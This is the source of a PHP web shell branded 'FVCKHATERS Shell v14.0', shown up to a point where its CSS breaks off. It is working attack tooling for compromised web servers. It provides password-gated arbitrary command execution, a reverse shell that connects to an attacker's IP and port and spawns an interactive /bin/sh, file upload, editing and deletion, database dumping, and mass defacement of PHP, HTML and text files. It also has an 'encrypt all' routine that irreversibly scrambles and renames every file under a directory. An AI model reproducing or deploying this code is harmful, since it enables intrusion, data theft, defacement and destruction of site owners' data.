<?php
// =============================================
// FVCKHATERS Shell v14.0 - Advanced Shell
// =============================================

session_start();
$auth_password = "admin123";

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . str_replace('?logout=1', '', $_SERVER['REQUEST_URI']));
    exit;
}

// Autentikasi
if (!isset($_SESSION['loggedin']) && isset($_POST['password'])) {
    if ($_POST['password'] === $auth_password) {
        $_SESSION['loggedin'] = true;
    }
}

if (!isset($_SESSION['loggedin'])) {
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>FVCKHATERS Shell - Login</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0a0a0a; display: flex; justify-content: center; align-items: center; height: 100vh; }
            .login-box { background: #1a0a0a; padding: 50px 40px; border-radius: 16px; box-shadow: 0 20px 60px rgba(255,0,0,0.1); width: 380px; border: 1px solid #3a1a1a; }
            .login-box .logo { text-align: center; margin-bottom: 30px; }
            .login-box .logo img { width: 80px; height: 80px; border-radius: 50%; border: 3px solid #ff4444; object-fit: cover; }
            .login-box .logo h1 { color: #ff4444; font-size: 26px; margin-top: 10px; font-weight: 700; }
            .login-box .logo p { color: #883333; font-size: 13px; }
            .login-box input[type="password"] { width: 100%; padding: 14px; background: #1a0a0a; border: 1px solid #3a1a1a; color: #ff6666; border-radius: 10px; margin-bottom: 15px; font-size: 14px; outline: none; transition: 0.3s; }
            .login-box input[type="password"]:focus { border-color: #ff4444; }
            .login-box input[type="submit"] { width: 100%; padding: 14px; background: #ff4444; border: none; color: #0a0a0a; border-radius: 10px; cursor: pointer; font-weight: 700; font-size: 14px; transition: 0.3s; }
            .login-box input[type="submit"]:hover { background: #cc3333; transform: translateY(-2px); }
        </style>
    </head>
    <body>
        <div class="login-box">
            <div class="logo">
                <img src="https://gurugokil.my.id/uploads/1783791356_74e443b2.jpg" alt="FVCKHATERS" onerror="this.style.display=\'none\';this.nextElementSibling.style.display=\'block\'">
                <i class="fas fa-skull" style="font-size:48px;color:#ff4444;display:none;"></i>
                <h1>FVCKHATERS</h1>
                <p>Advanced Shell</p>
            </div>
            <form method="POST">
                <input type="password" name="password" placeholder="Enter password" required>
                <input type="submit" value="Login">
            </form>
        </div>
    </body>
    </html>';
    exit;
}

// =============================================
// DOWNLOAD FILE
// =============================================

if (isset($_GET['download'])) {
    $file = basename($_GET['download']);
    $dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
    $fullPath = $dir . '/' . $file;
    
    if (file_exists($fullPath) && is_file($fullPath)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $file . '"');
        header('Content-Length: ' . filesize($fullPath));
        header('Cache-Control: no-cache, must-revalidate');
        header('Pragma: no-cache');
        readfile($fullPath);
        exit;
    } else {
        die('File not found!');
    }
}

// =============================================
// REVERSE SHELL AUTO EXECUTE
// =============================================

$reverseShellOutput = '';
$reverseShellError = '';

if (isset($_POST['execute_reverse_shell'])) {
    $ip = trim($_POST['reverse_ip']);
    $port = intval($_POST['reverse_port']);
    
    if (empty($ip) || $port <= 0 || $port > 65535) {
        $reverseShellError = 'Invalid IP or Port!';
    } else {
        $reverseShellOutput = "[+] Connecting to $ip:$port...\n";
        
        $timeout = 30;
        $sock = @fsockopen($ip, $port, $errno, $errstr, $timeout);
        
        if (!$sock) {
            $reverseShellError = "Connection failed: $errstr ($errno)";
            $reverseShellOutput .= "[-] Connection failed!\n";
        } else {
            $reverseShellOutput .= "[+] Connected successfully!\n";
            $reverseShellOutput .= "[+] Spawning shell...\n";
            
            $descriptorspec = array(
               0 => array("pipe", "r"),
               1 => array("pipe", "w"),
               2 => array("pipe", "w")
            );
            
            $shell = 'uname -a; w; id; /bin/sh -i';
            $process = proc_open($shell, $descriptorspec, $pipes);
            
            if (!is_resource($process)) {
                $reverseShellError = "Failed to spawn shell!";
                $reverseShellOutput .= "[-] Failed to spawn shell!\n";
            } else {
                $reverseShellOutput .= "[+] Shell spawned successfully!\n";
                $reverseShellOutput .= "[+] Interactive shell is ready!\n";
                $reverseShellOutput .= "[+] Type commands below or use your listener\n";
                $reverseShellOutput .= "[+] ----------------------------------------\n\n";
                
                stream_set_blocking($pipes[0], 0);
                stream_set_blocking($pipes[1], 0);
                stream_set_blocking($pipes[2], 0);
                stream_set_blocking($sock, 0);
                
                $info = "Connected to $ip:$port\n";
                $info .= "----------------------------------------\n";
                $info .= "Reverse Shell Active\n";
                $info .= "Type 'exit' to disconnect\n";
                $info .= "----------------------------------------\n\n";
                fwrite($sock, $info);
                
                $shellActive = true;
                $outputBuffer = '';
                $inputBuffer = '';
                
                while ($shellActive) {
                    $read_a = array($sock, $pipes[1], $pipes[2]);
                    $write_a = null;
                    $error_a = null;
                    
                    if (stream_select($read_a, $write_a, $error_a, 0, 200000) === false) {
                        break;
                    }
                    
                    if (in_array($sock, $read_a)) {
                        $input = fread($sock, 1400);
                        if ($input === false || $input === '') {
                            $shellActive = false;
                            break;
                        }
                        fwrite($pipes[0], $input);
                        if (trim($input) === 'exit') {
                            $shellActive = false;
                            break;
                        }
                    }
                    
                    if (in_array($pipes[1], $read_a)) {
                        $output = fread($pipes[1], 1400);
                        if ($output !== false && $output !== '') {
                            fwrite($sock, $output);
                            $outputBuffer .= $output;
                        }
                    }
                    
                    if (in_array($pipes[2], $read_a)) {
                        $output = fread($pipes[2], 1400);
                        if ($output !== false && $output !== '') {
                            fwrite($sock, $output);
                            $outputBuffer .= $output;
                        }
                    }
                }
                
                fclose($sock);
                fclose($pipes[0]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
                
                $reverseShellOutput .= "\n[!] Shell disconnected\n";
            }
        }
    }
}

// =============================================
// FUNGSI
// =============================================

function getCurrentDir() {
    return isset($_GET['dir']) ? $_GET['dir'] : getcwd();
}

function formatSize($bytes) {
    if ($bytes === 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
}

function getFileIcon($name) {
    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    $icons = [
        'php' => 'fab fa-php', 'html' => 'fab fa-html5', 'htm' => 'fab fa-html5',
        'css' => 'fab fa-css3-alt', 'js' => 'fab fa-js', 'json' => 'fas fa-code',
        'xml' => 'fas fa-code', 'jpg' => 'fas fa-image', 'jpeg' => 'fas fa-image',
        'png' => 'fas fa-image', 'gif' => 'fas fa-image', 'svg' => 'fas fa-image',
        'webp' => 'fas fa-image', 'pdf' => 'fas fa-file-pdf', 'txt' => 'fas fa-file-alt',
        'log' => 'fas fa-file-alt', 'zip' => 'fas fa-file-archive', 'tar' => 'fas fa-file-archive',
        'gz' => 'fas fa-file-archive', 'rar' => 'fas fa-file-archive', '7z' => 'fas fa-file-archive',
        'sql' => 'fas fa-database', 'py' => 'fab fa-python', 'sh' => 'fas fa-terminal',
        'exe' => 'fas fa-cog', 'mp4' => 'fas fa-video', 'mp3' => 'fas fa-music',
        'avi' => 'fas fa-video', 'mkv' => 'fas fa-video', 'doc' => 'fas fa-file-word',
        'docx' => 'fas fa-file-word', 'xls' => 'fas fa-file-excel', 'xlsx' => 'fas fa-file-excel',
        'ppt' => 'fas fa-file-powerpoint', 'pptx' => 'fas fa-file-powerpoint',
        'md' => 'fas fa-file-alt', 'yml' => 'fas fa-file-code', 'yaml' => 'fas fa-file-code',
        'conf' => 'fas fa-cog', 'ini' => 'fas fa-cog', 'htaccess' => 'fas fa-cog'
    ];
    return $icons[$ext] ?? 'fas fa-file';
}

function isTextFile($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $textExts = ['txt', 'php', 'html', 'htm', 'css', 'js', 'json', 'xml', 'md', 'yml', 'yaml', 'conf', 'ini', 'htaccess', 'log', 'sql', 'sh', 'py'];
    return in_array($ext, $textExts);
}

// =============================================
// ENCRYPTION FUNCTIONS
// =============================================

function generateRandomString($length = 32) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    return substr(str_shuffle(str_repeat($chars, $length)), 0, $length);
}

function encryptContent($content) {
    $layers = [
        function($data) { return base64_encode($data); },
        function($data) { 
            $parts = str_split($data, ceil(strlen($data)/2));
            return md5($parts[0] ?? '') . strrev($parts[1] ?? ''); 
        },
        function($data) {
            $arabic = ['ا','ب','ت','ث','ج','ح','خ','د','ذ','ر','ز','س','ش','ص','ض','ط','ظ','ع','غ','ف','ق','ك','ل','م','ن','ه','و','ي'];
            $german = ['ä','ö','ü','ß','Ä','Ö','Ü'];
            $japanese = ['あ','い','う','え','お','か','き','く','け','こ','さ','し','す','せ','そ','た','ち','つ','て','と','な','に','ぬ','ね','の'];
            $indian = ['अ','आ','इ','ई','उ','ऊ','ऋ','ए','ऐ','ओ','औ','क','ख','ग','घ','च','छ','ज','झ','ट','ठ','ड','ढ','ण','त','थ','द','ध','न','प','फ','ब','भ','म','य','र','ल','व','श','ष','स','ह'];
            $allChars = array_merge($arabic, $german, $japanese, $indian);
            $result = '';
            for ($i = 0; $i < strlen($data); $i++) {
                $result .= $allChars[ord($data[$i]) % count($allChars)];
                if ($i % 2 == 0) $result .= $allChars[(ord($data[$i]) + 7) % count($allChars)];
            }
            return $result;
        },
        function($data) { return hash('sha256', $data) . substr(strrev($data), 0, 16); },
        function($data) {
            $key = 'FVCKHATERS2024';
            $result = '';
            for ($i = 0; $i < strlen($data); $i++) {
                $result .= chr(ord($data[$i]) ^ ord($key[$i % strlen($key)]));
            }
            return base64_encode($result);
        }
    ];
    
    $result = $content;
    foreach ($layers as $layer) {
        $result = $layer($result);
    }
    return $result;
}

function encryptFilename($filename) {
    $ext = pathinfo($filename, PATHINFO_EXTENSION);
    $name = pathinfo($filename, PATHINFO_FILENAME);
    $encrypted = substr(md5($name . time() . generateRandomString(10)), 0, 32);
    $encrypted .= '.' . substr(md5($ext . generateRandomString(5)), 0, 8);
    return $encrypted;
}

// =============================================
// HANDLE ACTIONS
// =============================================

$currentDir = getCurrentDir();
$message = '';
$messageType = 'success';

// Upload File
if (isset($_FILES['uploaded_file']) && $_FILES['uploaded_file']['error'] === UPLOAD_ERR_OK) {
    $target = $currentDir . '/' . basename($_FILES['uploaded_file']['name']);
    if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $target)) {
        $message = 'File uploaded successfully to ' . htmlspecialchars($currentDir);
        $messageType = 'success';
    } else {
        $message = 'Failed to upload file';
        $messageType = 'error';
    }
}

// Create File
if (isset($_POST['create_file'])) {
    $filepath = $currentDir . '/' . $_POST['filename'];
    if (file_put_contents($filepath, $_POST['filecontent']) !== false) {
        $message = 'File created: ' . htmlspecialchars($_POST['filename']);
        $messageType = 'success';
    } else {
        $message = 'Failed to create file';
        $messageType = 'error';
    }
}

// Create Directory
if (isset($_POST['create_dir'])) {
    $dirpath = $currentDir . '/' . $_POST['dirname'];
    if (mkdir($dirpath, 0755)) {
        $message = 'Directory created: ' . htmlspecialchars($_POST['dirname']);
        $messageType = 'success';
    } else {
        $message = 'Failed to create directory';
        $messageType = 'error';
    }
}

// Delete
if (isset($_GET['delete'])) {
    $target = $currentDir . '/' . basename($_GET['delete']);
    if (is_file($target) && unlink($target)) {
        $message = 'Deleted: ' . htmlspecialchars($_GET['delete']);
        $messageType = 'success';
    } elseif (is_dir($target) && rmdir($target)) {
        $message = 'Deleted directory: ' . htmlspecialchars($_GET['delete']);
        $messageType = 'success';
    } else {
        $message = 'Failed to delete';
        $messageType = 'error';
    }
}

// Rename
if (isset($_POST['rename'])) {
    $old = $currentDir . '/' . $_POST['oldname'];
    $new = $currentDir . '/' . $_POST['newname'];
    if (rename($old, $new)) {
        $message = 'Renamed to: ' . htmlspecialchars($_POST['newname']);
        $messageType = 'success';
    } else {
        $message = 'Failed to rename';
        $messageType = 'error';
    }
}

// Edit File
if (isset($_POST['edit_file'])) {
    $filepath = $currentDir . '/' . $_POST['edit_filename'];
    if (file_put_contents($filepath, $_POST['edit_content']) !== false) {
        $message = 'File saved: ' . htmlspecialchars($_POST['edit_filename']);
        $messageType = 'success';
    } else {
        $message = 'Failed to save file';
        $messageType = 'error';
    }
}

// Search in File
$searchResults = [];
if (isset($_POST['search_in_file'])) {
    $filepath = $currentDir . '/' . $_POST['search_filename'];
    $searchTerm = $_POST['search_term'];
    if (file_exists($filepath) && is_file($filepath)) {
        $content = file_get_contents($filepath);
        $lines = explode("\n", $content);
        foreach ($lines as $lineNum => $line) {
            if (stripos($line, $searchTerm) !== false) {
                $searchResults[] = [
                    'line' => $lineNum + 1,
                    'content' => htmlspecialchars(trim($line))
                ];
            }
        }
        if (empty($searchResults)) {
            $message = 'No results found for "' . htmlspecialchars($searchTerm) . '"';
            $messageType = 'error';
        } else {
            $message = 'Found ' . count($searchResults) . ' results for "' . htmlspecialchars($searchTerm) . '"';
            $messageType = 'success';
        }
    } else {
        $message = 'File not found';
        $messageType = 'error';
    }
}

// Execute Command
if (isset($_POST['execute_cmd'])) {
    $cmd = $_POST['command'];
    $output = shell_exec($cmd . ' 2>&1');
    if ($output === null) {
        $output = 'Command executed but no output';
    }
} else {
    $output = '';
}

// Database Backup
if (isset($_POST['db_backup'])) {
    $host = $_POST['db_host'];
    $user = $_POST['db_user'];
    $pass = $_POST['db_pass'];
    $name = $_POST['db_name'];
    
    if (extension_loaded('mysqli')) {
        $conn = new mysqli($host, $user, $pass, $name);
        if (!$conn->connect_error) {
            $tables = [];
            $result = $conn->query("SHOW TABLES");
            while ($row = $result->fetch_array()) {
                $tables[] = $row[0];
            }
            
            $backup = "-- Database: $name\n-- Generated: " . date('Y-m-d H:i:s') . "\n\n";
            foreach ($tables as $table) {
                $result = $conn->query("SELECT * FROM $table");
                $numFields = $result->field_count;
                $backup .= "DROP TABLE IF EXISTS `$table`;\n";
                $row2 = $conn->query("SHOW CREATE TABLE $table")->fetch_row();
                $backup .= $row2[1] . ";\n\n";
                
                while ($row = $result->fetch_assoc()) {
                    $backup .= "INSERT INTO `$table` VALUES(";
                    $values = [];
                    foreach ($row as $value) {
                        $values[] = "'" . $conn->real_escape_string($value) . "'";
                    }
                    $backup .= implode(',', $values) . ");\n";
                }
                $backup .= "\n";
            }
            
            $filename = 'backup_' . $name . '_' . date('Ymd_His') . '.sql';
            file_put_contents($currentDir . '/' . $filename, $backup);
            $message = 'Database backup created: ' . $filename;
            $messageType = 'success';
            $conn->close();
        } else {
            $message = 'Database connection failed: ' . $conn->connect_error;
            $messageType = 'error';
        }
    } else {
        $message = 'MySQL extension not loaded';
        $messageType = 'error';
    }
}

// Bulk Delete
if (isset($_POST['bulk_delete'])) {
    $files = $_POST['bulk_files'] ?? [];
    $deleted = 0;
    foreach ($files as $file) {
        $target = $currentDir . '/' . basename($file);
        if (is_file($target) && unlink($target)) {
            $deleted++;
        } elseif (is_dir($target) && rmdir($target)) {
            $deleted++;
        }
    }
    $message = 'Deleted ' . $deleted . ' items';
    $messageType = 'success';
}

// =============================================
// MASS DEFACE FUNCTIONS
// =============================================

// Mass Deface PHP
if (isset($_POST['mass_deface_php'])) {
    $defaceContent = $_POST['deface_content_php'];
    $uploadedFile = $_FILES['deface_upload_php'] ?? null;
    
    if ($uploadedFile && $uploadedFile['error'] === UPLOAD_ERR_OK) {
        $defaceContent = file_get_contents($uploadedFile['tmp_name']);
    }
    
    if (!empty($defaceContent)) {
        $count = 0;
        $files = scandir($currentDir);
        foreach ($files as $file) {
            if ($file === '.' || $file === '..') continue;
            $fullPath = $currentDir . '/' . $file;
            if (is_file($fullPath) && pathinfo($file, PATHINFO_EXTENSION) === 'php') {
                if (file_put_contents($fullPath, $defaceContent) !== false) {
                    $count++;
                }
            }
        }
        $message = 'Mass Deface PHP completed! ' . $count . ' PHP files defaced.';
        $messageType = 'success';
    } else {
        $message = 'Please provide deface content or upload a file.';
        $messageType = 'error';
    }
}

// Mass Deface HTML
if (isset($_POST['mass_deface_html'])) {
    $defaceContent = $_POST['deface_content_html'];
    $uploadedFile = $_FILES['deface_upload_html'] ?? null;
    
    if ($uploadedFile && $uploadedFile['error'] === UPLOAD_ERR_OK) {
        $defaceContent = file_get_contents($uploadedFile['tmp_name']);
    }
    
    if (!empty($defaceContent)) {
        $count = 0;
        $files = scandir($currentDir);
        foreach ($files as $file) {
            if ($file === '.' || $file === '..') continue;
            $fullPath = $currentDir . '/' . $file;
            if (is_file($fullPath)) {
                $ext = pathinfo($file, PATHINFO_EXTENSION);
                if ($ext === 'html' || $ext === 'htm') {
                    if (file_put_contents($fullPath, $defaceContent) !== false) {
                        $count++;
                    }
                }
            }
        }
        $message = 'Mass Deface HTML completed! ' . $count . ' HTML files defaced.';
        $messageType = 'success';
    } else {
        $message = 'Please provide deface content or upload a file.';
        $messageType = 'error';
    }
}

// Mass Deface TXT
if (isset($_POST['mass_deface_txt'])) {
    $txtContent = $_POST['txt_content'];
    $fileType = $_POST['txt_file_type'];
    
    if (!empty($txtContent)) {
        $count = 0;
        $files = scandir($currentDir);
        foreach ($files as $file) {
            if ($file === '.' || $file === '..') continue;
            $fullPath = $currentDir . '/' . $file;
            if (is_file($fullPath)) {
                $ext = pathinfo($file, PATHINFO_EXTENSION);
                if ($fileType === 'index') {
                    if (in_array($file, ['index.php', 'index.html'])) {
                        $newFile = 'index.txt';
                        if (file_put_contents($currentDir . '/' . $newFile, $txtContent) !== false) {
                            unlink($fullPath);
                            $count++;
                        }
                    }
                } elseif ($fileType === 'all') {
                    if ($ext === 'php' || $ext === 'html' || $ext === 'htm') {
                        $newName = pathinfo($file, PATHINFO_FILENAME) . '.txt';
                        if (file_put_contents($currentDir . '/' . $newName, $txtContent) !== false) {
                            unlink($fullPath);
                            $count++;
                        }
                    }
                }
            }
        }
        $message = 'Mass Deface TXT completed! ' . $count . ' files converted to .txt';
        $messageType = 'success';
    } else {
        $message = 'Please provide text content.';
        $messageType = 'error';
    }
}

// Encrypt All
if (isset($_POST['encrypt_all'])) {
    $exclude = ['shell.php', 'index.php', 'index.html'];
    $count = 0;
    $encryptedFiles = [];
    
    function encryptDirectory($dir, &$count, $exclude, &$encryptedFiles) {
        $files = scandir($dir);
        foreach ($files as $file) {
            if ($file === '.' || $file === '..') continue;
            $fullPath = $dir . '/' . $file;
            
            if (in_array($file, $exclude)) continue;
            
            if (is_dir($fullPath)) {
                $newName = encryptFilename($file);
                $newPath = $dir . '/' . $newName;
                if (rename($fullPath, $newPath)) {
                    $encryptedFiles[] = 'Folder: ' . $file . ' -> ' . $newName;
                }
                encryptDirectory($newPath, $count, $exclude, $encryptedFiles);
            } else {
                $content = file_get_contents($fullPath);
                $encryptedContent = encryptContent($content);
                $newName = encryptFilename($file);
                $newPath = $dir . '/' . $newName;
                
                if (file_put_contents($newPath, $encryptedContent) !== false) {
                    unlink($fullPath);
                    $count++;
                    $encryptedFiles[] = 'File: ' . $file . ' -> ' . $newName;
                }
            }
        }
    }
    
    encryptDirectory($currentDir, $count, $exclude, $encryptedFiles);
    
    if ($count > 0) {
        $message = 'Encryption completed! ' . $count . ' files/folders encrypted.';
        $messageType = 'success';
        file_put_contents($currentDir . '/encryption_log.txt', 
            "Encryption Log\n" . date('Y-m-d H:i:s') . "\n" . implode("\n", $encryptedFiles) . "\n");
    } else {
        $message = 'No files were encrypted. Check excluded files.';
        $messageType = 'error';
    }
}

// =============================================
// GET SERVER INFO
// =============================================
$serverInfo = [
    'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
    'Server OS' => php_uname('s') . ' ' . php_uname('r'),
    'Server Hostname' => gethostname(),
    'Server IP Address' => $_SERVER['SERVER_ADDR'] ?? 'Unknown',
    'Server Port' => $_SERVER['SERVER_PORT'] ?? '80',
    'Document Root' => $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown',
    'Current User' => function_exists('get_current_user') ? get_current_user() : 'Unknown',
    'PHP Version' => phpversion(),
    'PHP SAPI' => php_sapi_name(),
    'Upload Max Size' => ini_get('upload_max_filesize'),
    'Post Max Size' => ini_get('post_max_size'),
    'Max Execution Time' => ini_get('max_execution_time') . 's',
    'Memory Limit' => ini_get('memory_limit'),
    'Disk Free Space' => function_exists('disk_free_space') ? formatSize(disk_free_space('/') ?: 0) : 'Unknown',
    'Disk Total Space' => function_exists('disk_total_space') ? formatSize(disk_total_space('/') ?: 0) : 'Unknown',
    'MySQL' => extension_loaded('mysqli') ? 'Enabled' : 'Disabled',
    'MySQL Version' => extension_loaded('mysqli') ? mysqli_get_client_info() : 'N/A',
    'GD Library' => extension_loaded('gd') ? 'Enabled' : 'Disabled',
    'GD Version' => extension_loaded('gd') ? gd_info()['GD Version'] ?? 'Unknown' : 'N/A',
    'CURL' => extension_loaded('curl') ? 'Enabled' : 'Disabled',
    'CURL Version' => extension_loaded('curl') ? curl_version()['version'] ?? 'Unknown' : 'N/A',
    'OpenSSL' => extension_loaded('openssl') ? 'Enabled' : 'Disabled',
    'OpenSSL Version' => extension_loaded('openssl') ? OPENSSL_VERSION_TEXT : 'N/A',
    'ZIP Archive' => class_exists('ZipArchive') ? 'Enabled' : 'Disabled',
    'JSON' => extension_loaded('json') ? 'Enabled' : 'Disabled',
    'MBString' => extension_loaded('mbstring') ? 'Enabled' : 'Disabled',
    'PDO' => extension_loaded('pdo') ? 'Enabled' : 'Disabled',
    'Session Support' => extension_loaded('session') ? 'Enabled' : 'Disabled',
    'Maximum File Uploads' => ini_get('max_file_uploads'),
    'Allow URL Fopen' => ini_get('allow_url_fopen') ? 'Enabled' : 'Disabled',
    'Allow URL Include' => ini_get('allow_url_include') ? 'Enabled' : 'Disabled',
    'Display Errors' => ini_get('display_errors') ? 'Enabled' : 'Disabled',
    'Server Time' => date('Y-m-d H:i:s'),
    'Server Timezone' => date_default_timezone_get(),
    'Load Average' => function_exists('sys_getloadavg') ? implode(', ', sys_getloadavg()) : 'N/A',
];

$serverInfoStatus = [
    'MySQL' => extension_loaded('mysqli'),
    'GD Library' => extension_loaded('gd'),
    'CURL' => extension_loaded('curl'),
    'OpenSSL' => extension_loaded('openssl'),
    'ZIP Archive' => class_exists('ZipArchive'),
    'JSON' => extension_loaded('json'),
    'MBString' => extension_loaded('mbstring'),
    'PDO' => extension_loaded('pdo'),
    'Session Support' => extension_loaded('session'),
];

// =============================================
// VIEW
// =============================================
$files = scandir($currentDir) ?: [];
$parentDir = dirname($currentDir);

$folders = [];
$fileList = [];
foreach ($files as $file) {
    if ($file === '.' || $file === '..') continue;
    $fullPath = $currentDir . '/' . $file;
    if (is_dir($fullPath)) {
        $folders[] = $file;
    } else {
        $fileList[] = $file;
    }
}
sort($folders);
sort($fileList);
$sortedFiles = array_merge($folders, $fileList);

$view = isset($_GET['view']) ? $_GET['view'] : 'terminal';
$showEditor = isset($_GET['edit']) && !empty($_GET['edit']);
$editFile = $showEditor ? basename($_GET['edit']) : '';
$editContent = '';
if ($showEditor && file_exists($currentDir . '/' . $editFile) && isTextFile($editFile)) {
    $editContent = htmlspecialchars(file_get_contents($currentDir . '/' . $editFile));
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FVCKHATERS Shell - Advanced Shell</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; 
            background: #0a0505; 
            color: #e8d0d0; 
            display: flex; 
            height: 100vh;
            overflow: hidden;
        }
        
        ::-webkit-scrollbar { width: 5px; height: 5px; }
        ::-webkit-scrollbar-track { background: #0a0505; }
        ::-webkit-scrollbar-thumb { background: #3a1a1a; border-radius: 3px; }
        ::-webkit-scrollbar-thumb:hover { background: #4a2a2a; }
        
        .sidebar {
            width: 230px;
            background: #0f0808;
            border-right: 1px solid #2a1515;
            display: flex;
            flex-direction: column;
            flex-shrink: 0;
            height: 100vh;
            overflow-y: auto;
        }
        
        .sidebar-header {
            padding: 22px 20px 18px;
            border-bottom: 1px solid #2a1515;
            text-align: center;
        }
        
        .sidebar-header .logo-img {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            border: 3px solid #ff4444;
            object-fit: cover;
            margin-bottom: 8px;
        }
        
        .sidebar-header .logo {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
        }
        
        .sidebar-header .logo h1 {
            font-size: 16px;
            font-weight: 800;
            color: #ff4444;
            letter-spacing: -0.5px;
        }
        
        .sidebar-header .logo h1 small {
            display: block;
            font-size: 9px;
            font-weight: 500;
            color: #883333;
            letter-spacing: 0.5px;
            margin-top: 1px;
        }
        
        .sidebar-nav {
            flex: 1;
            padding: 14px 0;
        }
        
        .nav-section {
            margin-bottom: 14px;
        }
        
        .nav-section-title {
            font-size: 9px;
            font-weight: 700;
            color: #663333;
            text-transform: uppercase;
            letter-spacing: 1.2px;
            padding: 0 20px;
            margin-bottom: 6px;
        }
        
        .nav-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 9px 20px;
            color: #aa8888;
            text-decoration: none;
            cursor: pointer;
            transition: all 0.15s;
            border-left: 3px solid transparent;
            font-size: 12.5px;
            font-weight: 500;
        }
        
        .nav-item i {
            width: 18px;
            font-size: 14px;
            color: #773333;
            transition: 0.15s;
            text-align: center;
        }
        
        .nav-item:hover {
            background: #1a0a0a;
            color: #ff6666;
        }
        
        .nav-item:hover i {
            color: #ff4444;
        }
        
        .nav-item.active {
            background: #1a0a0a;
            color: #ff6666;
            border-left-color: #ff4444;
        }
        
        .nav-item.active i {
            color: #ff4444;
        }
        
        .nav-item.logout-item {
            border-top: 1px solid #2a1515;
            margin-top: 8px;
            padding-top: 12px;
            color: #ff4444;
        }
        
        .nav-item.logout-item i {
            color: #ff4444;
        }
        
        .nav-item.logout-item:hover {
            background: #2a0a0a;
            color: #ff6666;
        }
        
        .sidebar-footer {
            padding: 14px 20px;
            border-top: 1px solid #2a1515;
            font-size: 10px;
        }
        
        .sidebar-footer .info-row {
            display: flex;
            flex-direction: column;
            margin-bottom: 4px;
        }
        
        .sidebar-footer .info-label {
            color: #663333;
            font-size: 8px;
            text-transform: uppercase;
            letter-spacing: 0.8px;
            font-weight: 600;
        }
        
        .sidebar-footer .info-value {
            color: #ff6666;
            font-weight: 600;
            font-size: 11px;
        }
        
        .sidebar-footer .info-value.host {
            color: #ff8844;
        }
        
        .sidebar-footer .creator-credit {
            margin-top: 8px;
            padding-top: 8px;
            border-top: 1px solid #2a1515;
            font-size: 9px;
            color: #553333;
            text-align: center;
        }
        
        .sidebar-footer .creator-credit strong {
            color: #ff4444;
        }
        
        .main {
            flex: 1;
            display: flex;
            flex-direction: column;
            height: 100vh;
            overflow: hidden;
            background: #0a0505;
        }
        
        .topbar {
            background: #0f0808;
            padding: 10px 24px;
            border-bottom: 1px solid #2a1515;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-shrink: 0;
        }
        
        .topbar .path {
            color: #aa8888;
            font-size: 12px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 8px;
            word-break: break-all;
        }
        
        .topbar .path i {
            color: #ff8844;
        }
        
        .topbar .path span {
            color: #ff6666;
        }
        
        .topbar .user-badge {
            font-size: 11px;
            color: #aa8888;
        }
        
        .topbar .user-badge i {
            color: #ff6666;
            margin-right: 6px;
        }
        
        .content {
            flex: 1;
            padding: 20px 24px;
            overflow-y: auto;
            background: #0a0505;
        }
        
        .alert {
            padding: 10px 16px;
            border-radius: 8px;
            margin-bottom: 16px;
            font-size: 12px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .alert.success {
            background: #1a0a0a;
            border: 1px solid #44ff8844;
            color: #66ff88;
        }
        
        .alert.error {
            background: #1a0a0a;
            border: 1px solid #ff444444;
            color: #ff6666;
        }
        
        /* REVERSE SHELL */
        .reverse-shell-card {
            background: #0f0808;
            border: 2px solid #ff4444;
            border-radius: 12px;
            padding: 25px;
            max-width: 700px;
        }
        
        .reverse-shell-card .card-title {
            font-size: 16px;
            font-weight: 800;
            color: #ff4444;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .reverse-shell-card .card-title i {
            font-size: 20px;
        }
        
        .reverse-shell-card .form-group {
            margin-bottom: 14px;
        }
        
        .reverse-shell-card .form-group label {
            display: block;
            color: #883333;
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.8px;
            margin-bottom: 4px;
        }
        
        .reverse-shell-card .form-group input {
            width: 100%;
            padding: 10px 14px;
            background: #0a0505;
            border: 1px solid #2a1515;
            border-radius: 8px;
            color: #e8d0d0;
            font-size: 13px;
            outline: none;
            font-family: 'Inter', sans-serif;
        }
        
        .reverse-shell-card .form-group input:focus {
            border-color: #ff4444;
        }
        
        .reverse-shell-card .form-group .input-hint {
            color: #553333;
            font-size: 10px;
            margin-top: 3px;
        }
        
        .reverse-shell-card .btn-execute {
            background: #ff4444;
            border: none;
            color: #0a0505;
            padding: 12px 24px;
            border-radius: 8px;
            font-weight: 700;
            font-size: 14px;
            cursor: pointer;
            transition: 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            width: 100%;
            justify-content: center;
            margin-top: 6px;
        }
        
        .reverse-shell-card .btn-execute:hover {
            background: #cc3333;
